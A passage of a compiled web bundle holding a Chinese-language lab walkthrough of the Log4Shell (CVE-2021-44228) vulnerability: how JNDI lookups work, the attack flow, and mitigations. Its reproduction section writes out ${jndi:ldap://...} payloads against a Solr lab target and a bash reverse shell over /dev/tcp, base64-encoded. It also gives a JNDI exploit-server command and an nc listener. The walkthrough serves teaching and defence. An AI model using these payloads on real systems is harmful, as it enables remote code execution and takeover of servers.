\u5bf9\u8c61\u7684\u83b7\u53d6\u65b9\u5f0f\uff0c\u83b7\u53d6\u65b9\u5f0f\u53ef\u4ee5\u79f0\u4e3aschema\uff0c\u6240\u4ee5\u6b63\u5e38\u7684\u5305\u542bjndi\u7684\u65e5\u5fd7\u8bb0\u5f55\u65b9\u5f0f\u5982\u4e0b\uff1a"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-java"},'logger.info("system propety: ${jndi:schema://url}");\n')),(0,n.kt)("p",null,"\u5176\u4e2d\uff0cschema \u662f\u67e5\u627ejndi\u5bf9\u8c61\u7684\u65b9\u5f0f\uff0cjdk\u4e2d\u652f\u6301 corbname, dns, iiop, iiopname, ldap, ldaps, rmi\u51e0\u79cdschema\u3002"),(0,n.kt)("p",null,"url\u662f\u51e0\u79cd\u4e0d\u540c\u7684schema\u4e0bjndi\u7684\u8def\u5f84\u3002\u4e0d\u540c\u7684schema\uff0curl\u8def\u5f84\u7684\u914d\u7f6e\u65b9\u6cd5\u4e0d\u540c\u3002\u5e38\u7528\u7684schame\u662fldap\uff0c\u5176url\u5199\u6cd5\u6bd4\u8f83\u7b80\u5355\uff1a",(0,n.kt)("inlineCode",{parentName:"p"},"jndi:ldap://xxx.dnslog.cn")),(0,n.kt)("p",null,"jdk\u5c06\u4eceurl\u6307\u5b9a\u7684\u8def\u5f84\u4e0b\u8f7d\u4e00\u6bb5\u5b57\u8282\u6d41\uff0c\u5e76\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u4e3aJava\u5bf9\u8c61\uff0c\u4f5c\u4e3ajndi\u8fd4\u56de\u3002\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u5373\u4f1a\u6267\u884c\u5b57\u8282\u6d41\u4e2d\u5305\u542b\u7684\u7a0b\u5e8f\u3002"),(0,n.kt)("p",null," \u56e0\u6b64\uff0c\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u63a7\u5236\u65e5\u5fd7\u6253\u5370\u7684\u5185\u5bb9\uff0c\u5c31\u53ef\u4ee5\u4f7f\u76ee\u6807\u670d\u52a1\u5668\u4ece\u653b\u51fb\u8005\u6307\u5b9a\u7684\u4efb\u610furl\u5730\u5740\u4e0b\u8f7d\u4ee3\u7801\u5b57\u8282\u6d41\uff0c\u653b\u51fb\u8005\u5728\u5b57\u8282\u6d41\u4e2d\u9644\u5e26\u7684\u4ee3\u7801\u5c31\u4f1a\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u3002"),(0,n.kt)("p",null," ",(0,n.kt)("strong",{parentName:"p"},"\u653b\u51fb\u8005\u5982\u4f55\u63a7\u5236\u670d\u52a1\u5668\u4e0a\u8bb0\u5f55\u7684\u65e5\u5fd7\u5185\u5bb9\u5462\uff1f")),(0,n.kt)("p",null," \u5927\u90e8\u5206web\u670d\u52a1\u7a0b\u5e8f\u90fd\u4f1a\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u65e5\u5fd7\u8bb0\u5f55\u3002\u4f8b\u5982\uff1a\u7528\u6237\u8bbf\u95ee\u4e86\u54ea\u4e9burl\uff0c\u6709\u54ea\u4e9b\u5173\u952e\u7684\u8f93\u5165\u7b49\uff0c\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u53c2\u6570\u9001\u5230log4j\u4e2d\uff0c\u6211\u4eec\u5728\u8fd9\u4e9b\u5730\u65b9\u5199\u4e0a ${jndi:ldap://xxx.dnslog.cn}\u5c31\u53ef\u4ee5\u4f7fweb\u670d\u52a1\u4ecexxx.dnslog.cn\u4e0b\u8f7d\u5b57\u8282\u6d41\u4e86\u3002"),(0,n.kt)("h6",{id:"jndi\u662f\u4ec0\u4e48"},(0,n.kt)("strong",{parentName:"h6"},"jndi\u662f\u4ec0\u4e48")),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"JNDI\uff08Java Naming and Directory Interface\uff0cJAVA\u547d\u540d\u548c\u76ee\u5f55\u63a5\u53e3\uff09\uff1a\u5b83\u63d0\u4f9b\u4e00\u4e2a\u76ee\u5f55\u7cfb\u7edf\uff0c\u5e76\u5c06\u670d\u52a1\u540d\u79f0\u4e0e\u5bf9\u8c61\u5173\u8054\u8d77\u6765\uff0c\u4ece\u800c\u4f7f\u5f97\u5f00\u53d1\u4eba\u5458\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u4f7f\u7528\u540d\u79f0\u6765\u8bbf\u95ee\u5bf9\u8c61\u3002JNDI\u4e0b\u9762\u6709\u5f88 \u591a\u76ee\u5f55\u63a5\u53e3\uff0c\u7528\u4e8e\u4e0d\u540c\u7684\u6570\u636e\u6e90\u7684\u67e5\u627e\u5f15\u7528\u3002")),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"JNDI\u6ce8\u5165\u4e3b\u8981\u662f\u7528\u4e0b\u8f7d\u8fdc\u7a0bclass\uff0c\u6765\u8fd0\u884c\u6076\u610f\u4ee3\u7801\u3002JNDI\u6ce8\u5165\u653b\u51fb\u65f6\u5e38\u7528\u7684\u5c31\u662f\u901a\u8fc7RMI\u548cLDAP\u4e24\u79cd\u670d\u52a1\u3002")),(0,n.kt)("h6",{id:"ldap\u670d\u52a1"},(0,n.kt)("strong",{parentName:"h6"},"ldap\u670d\u52a1")),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"LDAP(\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae)\u662f\u4e00\u4e2a\u5f00\u653e\u7684\uff0c\u4e2d\u7acb\u7684\uff0c\u5de5\u4e1a\u6807\u51c6\u7684\u5e94\u7528\u534f\u8bae\uff0c\u901a\u8fc7IP\u534f\u8bae\u63d0\u4f9b\u8bbf\u95ee \u63a7\u5236\u548c\u7ef4\u62a4\u5206\u5e03\u5f0f\u4fe1\u606f\u7684\u76ee\u5f55\u4fe1\u606f\u3002")),(0,n.kt)("p",null,"\u76ee\u5f55\u662f\u4e00\u4e2a\u4e3a\u67e5\u8be2\u3001\u6d4f\u89c8\u548c\u641c\u7d22\u800c\u4f18\u5316\u7684\u4e13\u4e1a\u5206\u5e03\u5f0f\u6570\u636e\u5e93\uff0c\u5b83\u5448 \u6811\u72b6\u7ed3\u6784\u7ec4\u7ec7\u6570\u636e\uff0c\u5c31\u597d\u8c61Linux/Unix\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u76ee\u5f55\u4e00\u6837"),(0,n.kt)("h6",{id:"rmi"},"RMI"),(0,n.kt)("p",null,"\u200b\tRMI\uff08\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff09\uff1a\u5b83\u662f\u4e00\u79cd\u673a\u5236\uff0c\u80fd\u591f\u8ba9\u5728\u67d0\u4e2ajava\u865a\u62df\u673a\u4e0a\u7684\u5bf9\u8c61\u8c03\u7528\u53e6\u4e00\u4e2aJava\u865a\u62df\u673a \u7684\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002"),(0,n.kt)("h4",{id:"0x03\u653b\u51fb\u8fc7\u7a0b"},"0x03\u653b\u51fb\u8fc7\u7a0b"),(0,n.kt)("p",null," log4j2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5927\u81f4\u8fc7\u7a0b\uff08\u6b64\u5904\u4f7f\u7528RMI\uff0cLDAP\u540c\u7406\uff09\uff1a \u5047\u8bbe\u6709\u4e00\u4e2aJava\u7a0b\u5e8f\uff0c\u5c06\u7528\u6237\u540d\u4fe1\u606f\u5230\u4e86\u65e5\u5fd7\u4e2d\uff0c\u5982\u4e0b\uff1a"),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/09/10/SBk3uLCRdWl5KxG.png",alt:"\u653b\u51fb\u8fc7\u7a0b"})),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"a."),"\u653b\u51fb\u8005\u53d1\u9001\u4e00\u4e2aHTTP\u8bf7\u6c42\uff0c\u5176\u7528\u6237\u540d\u4e3a${jndi://rmi:\u670d\u52a1\u5668\u5730\u5740/Exploit}"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"b."),"\u88ab\u653b\u51fb\u670d\u52a1\u5668\u53d1\u73b0\u8981\u8f93\u51fa\u7684\u4fe1\u606f\u4e2d\u6709 ${}\uff0c\u5219\u5176\u4e2d\u7684\u5185\u5bb9\u8981\u5355\u72ec\u5904\u7406\uff0c\u8fdb\u4e00\u6b65\u89e3\u6790\u662fJNDI\u6269\u5c55\u5185\u5bb9\u4e14\u4f7f\u7528\u7684\u662fRMI\uff0c\u800c\u540e\u6839\u636eRMI\u670d\u52a1\u5668\u5730\u5740\u53bb\u8bf7\u6c42Exploit\u3002"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"c."),"RMI\u670d\u52a1\u5668\u8fd4\u56deReference\u5bf9\u8c61\uff08\u7528\u4e8e\u544a\u8bc9\u8bf7\u6c42\u7aef\u6240\u8bf7\u6c42\u5bf9\u8c61\u6240\u5728\u7684\u7c7b\uff09\uff0c\u800c\u8be5Reference\u6307\u5b9a\u4e86\u8fdc\u7aef \u6587\u4ef6\u4e0b\u8f7d\u670d\u52a1\u5668\u4e0a\u542b\u6709\u6076\u610f\u4ee3\u7801\u7684class\u6587\u4ef6\u3002"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"d."),"\u88ab\u653b\u51fb\u670d\u52a1\u5668\u901a\u8fc7Reference\u5bf9\u8c61\u53bb\u8bf7\u6c42\u6587\u4ef6\u4e0b\u8f7d\u670d\u52a1\u5668\u4e0a\u7684class\u6587\u4ef6\u3002"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"e."),"\u88ab\u653b\u51fb\u670d\u52a1\u5668\u4e0b\u8f7d\u6076\u610fclass\u6587\u4ef6\u5e76\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801"),(0,n.kt)("p",null,"LDAP\n\u5f53\u7528\u6237\u8f93\u5165\u4fe1\u606f\u65f6\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684log4j2\u7ec4\u4ef6\u4f1a\u5c06\u4fe1\u606f\u8bb0\u5f55\u5230\u65e5\u5fd7\u4e2d"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"a."),"\u5047\u5982\u65e5\u5fd7\u4e2d\u542b\u6709\u8be5\u8bed\u53e5${jndi:ldap:192.168.96.1:1099/exp}"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"b."),"\u88ab\u653b\u51fb\u670d\u52a1\u5668\u53d1\u73b0\u8981\u8f93\u51fa\u7684\u4fe1\u606f\u4e2d\u6709 ${}\uff0clog4j\u5c31\u4f1a\u53bb\u89e3\u6790\u8be5\u4fe1\u606f\uff0c\u901a\u8fc7jndi\u7684lookup()\u65b9\u6cd5\u53bb\u89e3\u6790\u8be5URL\uff1aldap:192.168.96.1:1099/exp"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"c."),"\u89e3\u6790\u5230ldap\uff0c\u5c31\u4f1a\u53bb192.168.61.129:1099\u7684ldap\u670d\u52a1\u627e\u540d\u4e3aexp\u7684\u8d44\u6e90\uff0c\u5982\u679c\u627e\u4e0d\u5230\u5c31\u4f1a\u53bbhttp\u670d\u52a1\u4e2d\u627e\uff0c\u5728http\u4e2d\u627e\u5230exp\u4e4b\u540e\uff0c\u5c31\u4f1a\u5c06\u8d44\u6e90\u4fe1\u606f\u8fd4\u56de\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684log4j\u7ec4\u4ef6\uff0c\u800clog4j\u7ec4\u4ef6\u5c31\u4f1a\u4e0b\u8f7d\u4e0b\u6765\uff0c\u7136\u540e\u53d1\u73b0exp\u662f\u4e00\u4e2a.class\u6587\u4ef6\uff0c\u5c31\u4f1a\u53bb\u6267\u884c\u91cc\u9762\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u5b9e\u73b0\u6ce8\u5165\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u901a\u8fc7shell\u5b9e\u73b0\u4efb\u610f\u7684\u547d\u4ee4\u6267\u884c\uff0c\u9020\u6210\u4e25\u91cd\u5371\u5bb3"),(0,n.kt)("h4",{id:"0x04\u6f0f\u6d1e\u590d\u73b0"},"0x04\u6f0f\u6d1e\u590d\u73b0"),(0,n.kt)("h5",{id:"\u6f0f\u6d1e\u73af\u5883"},"\u6f0f\u6d1e\u73af\u5883"),(0,n.kt)("p",null,"\u9776\u673a\uff1akali 192.168.191.130  vulhub:cve-2021-44228"),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/09/10/krF1NSxVvZ94yo6.png",alt:"\u542f\u52a8cve-2021-44228"})),(0,n.kt)("p",null,"\u653b\u51fb\u673a\uff1awindows 10 192.168.191.180"),(0,n.kt)("p",null,"exp:",(0,n.kt)("a",{parentName:"p",href:"https://github.com/WhiteHSBG/JNDIExploit/releases/tag/v1.4"},"https://github.com/WhiteHSBG/JNDIExploit/releases/tag/v1.4")),(0,n.kt)("h5",{id:"1\u8bbf\u95ee\u9776\u673a"},"1.\u8bbf\u95ee\u9776\u673a"),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/09/10/fmgMxQ8i9suyN5E.png",alt:"\u8bbf\u95ee-cve-2021-44228"})),(0,n.kt)("h5",{id:"2dns\u56de\u663e\u9a8c\u8bc1"},"2.dns\u56de\u663e\u9a8c\u8bc1"),(0,n.kt)("p",null,"\u5728\u6ce8\u5165\u70b9\u63d2\u5165Payload"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},"/solr/admin/cores?action=${jndi:ldap://ydu4yt.ceye.io}\n")),(0,n.kt)("p",null,"\u67e5\u770bcecy\u662f\u5426\u8fd4\u56de\u6570\u636e"),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/09/10/kD5c9oYmjQaCzLn.png",alt:"dns\u56de\u663e"})),(0,n.kt)("h5",{id:"3\u5c06bash\u53cd\u5f39shell\u547d\u4ee4\u7f16\u7801\u5907\u7528"},"3.\u5c06bash\u53cd\u5f39shell\u547d\u4ee4\u7f16\u7801\u5907\u7528"),(0,n.kt)("p",null,"bash \u547d\u4ee4\u53cd\u5f39shell"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"bash -i >& /dev/tcp/192.168.191.180/5555 0>&1\n")),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("inlineCode",{parentName:"li"},"bash"),": \u542f\u52a8\u4e00\u4e2a Bash shell\u3002"),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("inlineCode",{parentName:"li"},"-i"),": \u6253\u5f00\u4e00\u4e2a\u4ea4\u4e92\u5f0f shell \u4f1a\u8bdd\uff0c\u5141\u8bb8\u7528\u6237\u8f93\u5165\u547d\u4ee4\u548c\u83b7\u53d6\u8f93\u51fa\u3002"),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("inlineCode",{parentName:"li"},">& /dev/tcp/192.168.192.180/5555"),": \u5c06\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6307\u5b9a\u7684 IP \u5730\u5740\u4e3a ",(0,n.kt)("inlineCode",{parentName:"li"},"192.168.191.180"),"\u3001\u7aef\u53e3\u53f7\u4e3a `5555 \u2019 TCP \u8fde\u63a5\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u5c06\u5c1d\u8bd5\u5efa\u7acb\u4e00\u4e2a\u4e0e\u8be5 IP \u5730\u5740\u548c\u7aef\u53e3\u53f7\u8fde\u63a5\u7684\u7f51\u7edc\u5957\u63a5\u5b57\uff0c\u5e76\u5c06\u8f93\u51fa\u53d1\u9001\u5230\u8be5\u8fde\u63a5\u3002"),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("inlineCode",{parentName:"li"},"0>&1"),": \u5c06\u6807\u51c6\u8f93\u5165\uff08\u6587\u4ef6\u63cf\u8ff0\u7b26 0\uff09\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa\uff08\u6587\u4ef6\u63cf\u8ff0\u7b26 1\uff09\uff0c\u610f\u5473\u7740\u8f93\u5165\u548c\u8f93\u51fa\u90fd\u5c06\u901a\u8fc7\u7f51\u7edc\u5957\u63a5\u5b57\u8fdb\u884c\u4f20\u8f93\u3002")),(0,n.kt)("p",null,"base64\u7f16\u7801\uff1a"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},"YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5MS4xODAvNTU1NSAwPiYxCg==\n")),(0,n.kt)("h5",{id:"4\u4f7f\u7528jndiexploit\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528"},"4.\u4f7f\u7528JNDIExploit\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528"),(0,n.kt)("p",null,"\u5c06\u4e0a\u9762base64\u7f16\u7801\u540e\u7684bash\u547d\u4ee4\u586b\u5165\u6307\u5b9a\u4f4d\u7f6e"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},'java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\u3000-C "bash -c {echo,Base64\u7f16\u7801\u540e\u7684Payload} | {base64,-d} | {bash,-i} -A "\u653b\u51fb\u673aIP"\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5MS4xODAvNTU1NSAwPiYxCg==}|{base64,-d}|{bash,-i}" -A "192.168.191.180"\n')),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/09/10/hLmT3649aZ5qkuP.png",alt:"exp\u542f\u52a8\u670d\u52a1"})),(0,n.kt)("h5",{id:"5\u5728\u653b\u51fb\u673a\u4e2d\u5f00\u542f\u76d1\u542c"},"5.\u5728\u653b\u51fb\u673a\u4e2d\u5f00\u542f\u76d1\u542c"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},"nc -lvvp 5555\n")),(0,n.kt)("h5",{id:"6\u4f7f\u7528payload\u7684\u8fdb\u884c\u653b\u51fb"},"6.\u4f7f\u7528payload\u7684\u8fdb\u884c\u653b\u51fb"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},"http://192.168.191.130:8983/solr/admin/cores?action=${jndi:ldap://192.168.191.180:1389/w2qmkw}\n")),(0,n.kt)("h5",{id:"7\u67e5\u770b\u56de\u663e"},"7.\u67e5\u770b\u56de\u663e"),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/09/10/xEuaeQMVckCmzoi.png",alt:"\u67e5\u770b\u56de\u663e"})),(0,n.kt)("h4",{id:"0x05\u6f0f\u6d1e\u4fee\u590d"},"0x05\u6f0f\u6d1e\u4fee\u590d"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"\u66f4\u65b0log4j\u81f3 rc2"),(0,n.kt)("li",{parentName:"ul"},"\u914d\u7f6e\u9632\u706b\u5899\u7b56\u7565\uff0c\u7981\u6b62\u4e3b\u52a8\u8fde\u63a5\u5916\u7f51\u8bbe\u5907"),(0,n.kt)("li",{parentName:"ul"},"\u5347\u7ea7\u53d7\u5f71\u54cd\u7684\u5e94\u7528\u53ca\u7ec4\u4ef6"),(0,n.kt)("li",{parentName:"ul"},"\u8fc7\u6ee4\u76f8\u5173\u7684\u5173\u952e\u8bcd\uff0c\u6bd4\u5982${jndi://*}"),(0,n.kt)("li",{parentName:"ul"},"\u9650\u5236JNDI\u9ed8\u8ba4\u53ef\u4ee5\u4f7f\u7528\u7684\u534f\u8bae"),(0,n.kt)("li",{parentName:"ul"},"\u9650\u5236\u53ef\u4ee5\u901a\u8fc7LDAP\u8bbf\u95ee\u7684\u670d\u52a1\u5668\u548c\u7c7b")))}d.isMDXComponent=!0}}]);